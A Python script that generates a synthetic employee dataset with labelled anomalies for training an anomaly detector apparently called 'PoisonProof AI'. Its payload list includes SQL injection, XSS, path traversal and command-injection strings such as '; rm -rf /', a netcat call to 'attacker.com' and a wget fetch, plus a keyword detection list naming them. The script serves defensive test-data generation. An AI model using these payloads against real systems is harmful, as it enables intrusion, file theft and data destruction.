#!/usr/bin/env python3
"""
Training Dataset Generator for PoisonProof AI
Creates realistic datasets with normal and anomalous patterns
"""

import pandas as pd
import numpy as np
from datetime import datetime, timedelta
import random
import string

# Set random seed for reproducibility
np.random.seed(42)
random.seed(42)

def generate_normal_employee_data(n_samples=800):
    """Generate normal employee data"""
    
    departments = ['Engineering', 'Sales', 'HR', 'Finance', 'Marketing', 'Operations']
    locations = ['New York', 'San Francisco', 'London', 'Tokyo', 'Singapore', 'Berlin']
    
    data = {
        'employee_id': [f'EMP{str(i).zfill(5)}' for i in range(1000, 1000 + n_samples)],
        'name': [f'{random.choice(["John", "Jane", "Alice", "Bob", "Charlie", "Diana"])} {random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia"])}' for _ in range(n_samples)],
        'age': np.random.normal(35, 8, n_samples).clip(22, 65).astype(int),
        'salary': np.random.normal(75000, 20000, n_samples).clip(40000, 200000).astype(int),
        'years_experience': np.random.normal(8, 4, n_samples).clip(0, 35).astype(int),
        'department': [random.choice(departments) for _ in range(n_samples)],
        'location': [random.choice(locations) for _ in range(n_samples)],
        'performance_score': np.random.normal(7.5, 1.5, n_samples).clip(4, 10).round(1),
        'projects_completed': np.random.poisson(12, n_samples),
        'days_absent': np.random.poisson(5, n_samples),
    }
    
    return pd.DataFrame(data)

def inject_statistical_anomalies(df, n_anomalies=50):
    """Inject statistical outliers (MAD/IQR detectable)"""
    
    anomaly_indices = random.sample(range(len(df)), n_anomalies)
    
    for idx in anomaly_indices:
        anomaly_type = random.choice(['extreme_salary', 'extreme_age', 'extreme_absence', 'extreme_projects'])
        
        if anomaly_type == 'extreme_salary':
            df.at[idx, 'salary'] = random.choice([15000, 350000, 500000])  # Too low or too high
            
        elif anomaly_type == 'extreme_age':
            df.at[idx, 'age'] = random.choice([18, 75, 82])  # Too young or too old
            
        elif anomaly_type == 'extreme_absence':
            df.at[idx, 'days_absent'] = random.choice([45, 60, 90])  # Excessive absences
            
        elif anomaly_type == 'extreme_projects':
            df.at[idx, 'projects_completed'] = random.choice([0, 1, 50, 100])  # Too few or many
    
    return df

def inject_malicious_payloads(df, n_injections=50):
    """Inject SQL injection, XSS, and command injection patterns"""
    
    injection_patterns = [
        # SQL Injection
        "'; DROP TABLE users--",
        "1' OR '1'='1",
        "admin'--",
        "' UNION SELECT * FROM passwords--",
        "1'; DELETE FROM employees WHERE '1'='1",
        
        # XSS Attacks
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert('Hacked')",
        "<iframe src='malicious.com'>",
        "<svg onload=alert('XSS')>",
        
        # Command Injection
        "; rm -rf /",
        "| nc attacker.com 4444",
        "$(wget malicious.sh)",
        "`cat /etc/passwd`",
        "; whoami",
        
        # Path Traversal
        "../../../etc/passwd",
        "..\\..\\windows\\system32",
        
        # LDAP Injection
        "*)(uid=*",
        "admin)(|(password=*))",
        
        # NoSQL Injection
        "{'$ne': null}",
        "{'$gt': ''}",
    ]
    
    injection_indices = random.sample(range(len(df)), n_injections)
    
    for idx in injection_indices:
        # Inject into name field
        df.at[idx, 'name'] = random.choice(injection_patterns)
    
    return df

def inject_data_inconsistencies(df, n_inconsistencies=30):
    """Inject logical inconsistencies"""
    
    inconsistency_indices = random.sample(range(len(df)), n_inconsistencies)
    
    for idx in inconsistency_indices:
        inconsistency_type = random.choice(['salary_experience_mismatch', 'age_experience_mismatch', 'negative_values'])
        
        if inconsistency_type == 'salary_experience_mismatch':
            # Junior employee with senior salary
            df.at[idx, 'years_experience'] = random.randint(0, 2)
            df.at[idx, 'salary'] = random.randint(150000, 200000)
            
        elif inconsistency_type == 'age_experience_mismatch':
            # Young age with high experience (impossible)
            df.at[idx, 'age'] = random.randint(22, 25)
            df.at[idx, 'years_experience'] = random.randint(20, 30)
            
        elif inconsistency_type == 'negative_values':
            # Negative or zero values where they shouldn't be
            df.at[idx, 'salary'] = random.choice([-5000, 0, -100])
    
    return df

def add_labels(df):
    """Add anomaly labels for supervised learning"""
    
    # Initialize all as normal
    df['is_anomaly'] = 0
    
    # Label statistical anomalies using MAD
    salary_mad = np.median(np.abs(df['salary'] - df['salary'].median()))
    age_mad = np.median(np.abs(df['age'] - df['age'].median()))
    absence_mad = np.median(np.abs(df['days_absent'] - df['days_absent'].median()))
    
    salary_z = np.abs((df['salary'] - df['salary'].median()) / (salary_mad + 1e-10))
    age_z = np.abs((df['age'] - df['age'].median()) / (age_mad + 1e-10))
    absence_z = np.abs((df['days_absent'] - df['days_absent'].median()) / (absence_mad + 1e-10))
    
    df.loc[(salary_z > 3.5) | (age_z > 3.5) | (absence_z > 3.5), 'is_anomaly'] = 1
    
    # Label injection attacks
    injection_keywords = [
        'script', 'DROP', 'UNION', 'SELECT', 'DELETE', '--', 
        'alert', 'onerror', 'javascript:', 'iframe', 'svg',
        'rm -rf', 'nc ', 'wget', 'passwd', 'whoami',
        '../', r'..\\', r'\$ne', r'\$gt', 'uid='
    ]
    
    for keyword in injection_keywords:
        df.loc[df['name'].str.contains(keyword, case=False, na=False, regex=False), 'is_anomaly'] = 1
    
    # Label data inconsistencies
    df.loc[df['salary'] <= 0, 'is_anomaly'] = 1
    df.loc[(df['age'] < 25) & (df['years_experience'] > 15), 'is_anomaly'] = 1
    df.loc[(df['years_experience'] < 3) & (df['salary'] > 140000), 'is_anomaly'] = 1
    
    return df

def generate_training_dataset(n_total=1000):
    """Generate complete training dataset"""
    
    print("🔨 Generating Training Dataset for PoisonProof AI")
    print("=" * 60)
    
    # Generate normal data (80% of dataset)
    n_normal = int(n_total * 0.8)
    print(f"\n1️⃣ Generating {n_normal} normal records...")
    df = generate_normal_employee_data(n_normal)
    
    # Inject various types of anomalies (20% of dataset)
    n_anomalies = n_total - n_normal
    
    print(f"2️⃣ Injecting statistical anomalies (~{int(n_anomalies * 0.4)} records)...")
    df = inject_statistical_anomalies(df, int(n_anomalies * 0.4))
    
    print(f"3️⃣ Injecting malicious payloads (~{int(n_anomalies * 0.4)} records)...")
    df = inject_malicious_payloads(df, int(n_anomalies * 0.4))
    
    print(f"4️⃣ Injecting data inconsistencies (~{int(n_anomalies * 0.2)} records)...")
    df = inject_data_inconsistencies(df, int(n_anomalies * 0.2))
    
    # Add labels
    print("5️⃣ Adding anomaly labels...")
    df = add_labels(df)
    
    # Shuffle the dataset
    print("6️⃣ Shuffling dataset...")
    df = df.sample(frac=1, random_state=42).reset_index(drop=True)
    
    return df

def generate_summary_stats(df):
    """Generate and print dataset statistics"""
    
    print("\n" + "=" * 60)
    print("📊 DATASET STATISTICS")
    print("=" * 60)
    
    print(f"\n✓ Total records: {len(df)}")
    print(f"✓ Normal records: {(df['is_anomaly'] == 0).sum()} ({(df['is_anomaly'] == 0).sum() / len(df) * 100:.1f}%)")
    print(f"✓ Anomalous records: {(df['is_anomaly'] == 1).sum()} ({(df['is_anomaly'] == 1).sum() / len(df) * 100:.1f}%)")
    
    print(f"\n📋 Features:")
    for col in df.columns:
        if col != 'is_anomaly':
            print(f"   • {col}: {df[col].dtype}")
    
    print(f"\n🎯 Target variable:")
    print(f"   • is_anomaly: {df['is_anomaly'].value_counts().to_dict()}")
    
    print(f"\n📈 Numerical features statistics:")
    numeric_cols = ['age', 'salary', 'years_experience', 'performance_score', 'projects_completed', 'days_absent']
    stats = df[numeric_cols].describe()
    print(stats.round(2))
    
    print(f"\n🔍 Sample anomalies detected:")
    anomalies = df[df['is_anomaly'] == 1].head(5)
    for idx, row in anomalies.iterrows():
        print(f"\n   Record {idx}:")
        print(f"      Name: {row['name'][:50]}")
        print(f"      Salary: ${row['salary']:,}")
        print(f"      Age: {row['age']}, Experience: {row['years_experience']} years")

def main():
    """Main execution"""
    
    # Generate dataset
    df = generate_training_dataset(n_total=1000)
    
    # Generate statistics
    generate_summary_stats(df)
    
    # Save to CSV
    output_file = 'training_dataset.csv'
    df.to_csv(output_file, index=False)
    
    print(f"\n" + "=" * 60)
    print(f"✅ Dataset saved to: {output_file}")
    print(f"=" * 60)
    
    print(f"\n📝 Usage:")
    print(f"   1. Upload {output_file} to PoisonProof AI")
    print(f"   2. Scan for anomalies (will detect ~{(df['is_anomaly'] == 1).sum()} anomalies)")
    print(f"   3. Clean the dataset (auto or manual)")
    print(f"   4. Train a model using 'is_anomaly' as target")
    print(f"   5. Model will learn to detect similar patterns!")
    
    print(f"\n🎯 Expected results:")
    print(f"   • Detection: ~{(df['is_anomaly'] == 1).sum()} anomalies (MAD + IQR + injection patterns)")
    print(f"   • Training accuracy: 85-95% (DecisionTree/LogisticRegression)")
    print(f"   • Model can detect: SQL injection, XSS, statistical outliers, inconsistencies")
    
    print(f"\n🚀 Ready for training! Happy hacking! 🛡️\n")

if __name__ == "__main__":
    main()
